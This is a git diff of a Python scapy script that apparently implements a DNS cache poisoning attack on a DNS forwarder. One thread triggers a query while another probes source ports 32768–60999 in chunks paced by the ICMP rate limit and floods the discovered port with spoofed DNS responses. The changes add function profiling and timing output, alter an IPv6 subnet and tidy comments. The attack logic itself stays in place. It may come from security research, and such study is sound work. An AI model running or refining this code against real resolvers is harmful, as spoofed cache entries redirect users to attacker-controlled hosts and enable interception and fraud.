@@ -4,16 +4,12 @@ from scapy.all import *
 import random
 import time
 import threading
+import collections
 from ipaddress import IPv6Network, IPv6Address
+from functools import wraps
 
 
 lock = threading.Lock()
-
-
-def get_my_ip():
-    ret = socket.gethostbyname(socket.gethostname())
-    print (ret)
-    return ret
 
 def get_random_domain():
     '''
@@ -28,12 +24,11 @@ def get_random_domain():
             domain_names.append(line)
     return random.choice(domain_names)
 
+"""
+Generate a random IPv6 address for a specified subnet
+"""
 def random_ipv6_address():
-    """
-    Generate a random IPv6 address for a specified subnet
-    """
-    
-    subnet = '2001:db8:100::/64'
+    subnet = 'fe80:800:27ff::/64'
 
     random.seed(time.time())
     network = IPv6Network(subnet)
@@ -53,6 +48,45 @@ ICMP_recovering_time = '20ms'
 finished = 0
 
 
+#https://stackoverflow.com/a/58135538/3450691
+# To count time elapsed by a function
+
+PROF_DATA = collections.defaultdict(list)
+
+def profile(fn):
+    @wraps(fn)
+    def with_profiling(*args, **kwargs):
+        start_time = time.process_time()
+        ret = fn(*args, **kwargs)
+        elapsed_time = time.process_time() - start_time
+        PROF_DATA[fn.__name__].append(elapsed_time)
+        return ret
+    return with_profiling
+
+Metrics = collections.namedtuple("Metrics", "sum_time num_calls min_time max_time avg_time fname")
+
+def print_profile_data():
+    results = []
+    for fname, elapsed_times in PROF_DATA.items():
+        num_calls = len(elapsed_times)
+        min_time = min(elapsed_times)
+        max_time = max(elapsed_times)
+        sum_time = sum(elapsed_times)
+        avg_time = sum_time / num_calls
+        metrics = Metrics(sum_time, num_calls, min_time, max_time, avg_time, fname)
+        results.append(metrics)
+    total_time = sum([m.sum_time for m in results])
+    print("\t".join(["Percent", "Sum", "Calls", "Min", "Max", "Mean", "Function"]))
+    for m in sorted(results, reverse=True):
+        print("%.1f\t%.3f\t%d\t%.3f\t%.3f\t%.3f\t%s" % 
+        (100 * m.sum_time / total_time, m.sum_time, m.num_calls, m.min_time, m.max_time, m.avg_time, m.fname))
+    print ("%.3f Total Time" % total_time)
+
+def clear_profile_data():
+    global PROF_DATA
+    PROF_DATA = {}
+
+
 def initialize():
     # Initialize local_free_ip list
     local_ip_base = '192.168.58.'
@@ -64,6 +98,7 @@ def initialize():
         now += 1
     #print (local_free_ip)
     print (len(local_free_ip))
+
 
 '''
 def step1(thread_id):
@@ -111,7 +146,6 @@ def step1(thread_id):
 
 def step1(thread_id):
     
-    # Need to check if this function really works
     ip_layer = IP(dst=forwarder_ip)
     udp_layer = UDP(dport=forwarder_port, sport=RandShort())
     dns_layer = DNS(rd=1, qd=DNSQR(qname=domain_name))
@@ -122,10 +156,12 @@ def step1(thread_id):
     ret = sr1(packet, verbose=True)
     lock.release()
 
-    print (ret.show())
+    #print (ret.show())
+    return
 
 # We are going to use this for infering the actual source port also,
 # that's why adding another parameter 'number_of_padding_packet'
+@profile
 def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding_packet):
 
     print("do_one_attack_chunk " + str(port_start) + "," + str(number_of_probe_packet) +
@@ -134,11 +170,6 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
 
     #print("Sleeping for 50ms")
     time.sleep(0.05)
-
-    #ip_layer = IP(dst=forwarder_ip, src=random.choice(local_free_ip)) # not specifying the src, so that scapy can fill this up
-    #ip_layer = IP(dst=forwarder_ip, src=RandIP())
-    #udp_layer = UDP(dport=forwarder_port, sport=RandShort())
-    #packet = ip_layer / udp_layer / dns_layer
 
     now_port = port_start
 
@@ -224,19 +255,8 @@ def flood_the_port_with_spoofed_dns_response(actual_port):
 
 def step2(thread_id, source_port_range_start, source_port_range_end):
     #need to run this file with sudo because of port 53
-    '''
-    # initially trying to send a upd probe packet to the dns server to get any reply first
-    # using the actual ip of this machine, but not getting it at this moment
-    ip_layer = IP(dst=forwarder_ip) # not specifying the src, so that scapy can fill this up
-    udp_layer = UDP(dport=forwarder_port, sport=attacker_port)
-    dns_layer = DNS(rd=1,qd=DNSQR(qname=get_random_domain()))
-    packet = ip_layer / udp_layer / dns_layer
-    #send(packet)
-    ret = sr(packet)
-    print(ret)
-    '''
 
-    print("thread id : " + str(thread_id))
+    #print("thread id: " + str(thread_id))
 
     # Wait for the thread 1 to send the dns query first (aka, acruire the lock)
     while lock.locked() == False:
@@ -246,7 +266,10 @@ def step2(thread_id, source_port_range_start, source_port_range_end):
 
     while lock.locked() and start + ICMP_limit_rate <= source_port_range_end:
         #print("lock status: " + str(lock.locked()))
-        start_time_one_chunk = time.perf_counter() #for system wide time count
+
+        #for system wide time count + sleep also
+        #another option was time.process_time() (check)
+        start_time_one_chunk = time.perf_counter()
         
         #print("Calling do_one_attack_chunk")
         ret = do_one_chunk_of_attack(start, ICMP_limit_rate, 0)
@@ -262,29 +285,31 @@ def step2(thread_id, source_port_range_start, source_port_range_end):
                     finished = 1
                     return
 
-        '''
+        
         end_time_one_chunk = time.perf_counter()
         time_elapsed_for_one_chunk = end_time_one_chunk - start_time_one_chunk
-        if (time_elapsed_for_one_chunk < ICMP_recovering_time)
-            time.sleep(ICMP_recovering_time - time_elapsed_for_one_chunk)
-        '''
+        #if (time_elapsed_for_one_chunk < ICMP_recovering_time)
+        #    time.sleep(ICMP_recovering_time - time_elapsed_for_one_chunk)
+        print ("System wide time needed in this loop: " + str(time_elapsed_for_one_chunk))
+        
         start += ICMP_limit_rate
+
+    print_profile_data()
 
     # Either actual dns response has been reached or tried all source ports
     return False
 
 def main():
-    #step1();
-    #step2();
+
     initialize()
     
     iteration = 1
 
     while finished == 0:
-        t1 = threading.Thread(target=step1, args=(2 * iteration, ))
+
+        t1 = threading.Thread(target=step1, args=(2 * iteration - 1, ))
         t1.start()
-        t2 = threading.Thread(target=step2, args=(2 * iteration + 1, 32768, 60999))
-        #t2 = threading.Thread(target=step2, args=(2, 32768, 60999))
+        t2 = threading.Thread(target=step2, args=(2 * iteration, 32768, 60999))
         t2.start()
 
         t1.join()
